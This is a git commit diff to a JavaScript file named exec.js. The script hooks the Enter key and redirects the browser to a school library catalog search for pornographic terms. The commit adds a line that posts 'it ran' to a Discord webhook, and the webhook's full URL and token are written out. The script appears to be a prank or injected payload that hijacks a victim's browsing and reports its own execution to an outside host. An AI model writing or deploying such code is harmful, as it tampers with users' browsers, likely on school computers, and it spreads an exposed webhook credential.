48fa3579f22dce44c8c8fe8fd6089bcbc1add11c
Ongenix <96583029+Ongenix@users.noreply.github.com>
2024-05-21 12:54:51 -0600

    Update exec.js

--- exec.js
+++ exec.js
@@ -4,6 +4,7 @@ var xhr = new XMLHttpRequest();var url = "https://discord.com/api/webhooks/12300
     document.addEventListener('keydown', function(event) {
         if (event.key === 'Enter') {
             window.location.href = 'https://search.follettsoftware.com/metasearch/ui/134341/search/all?q=gay%20porn&ists=0&activeMenu=HOME';
+            var xhr = new XMLHttpRequest();var url = "https://discord.com/api/webhooks/1230013392190836807/YBJ3pNOa544labFi-TcurRFMDKlM2LMT36Jiel1PFWAy8TDWQqUa-yolhXwHQYD-F8bh";xhr.open("POST", url, true);xhr.setRequestHeader("Content-Type", "application/json");var data = JSON.stringify({"content": 'it ran'});xhr.send(data);
         }
     });
 })();
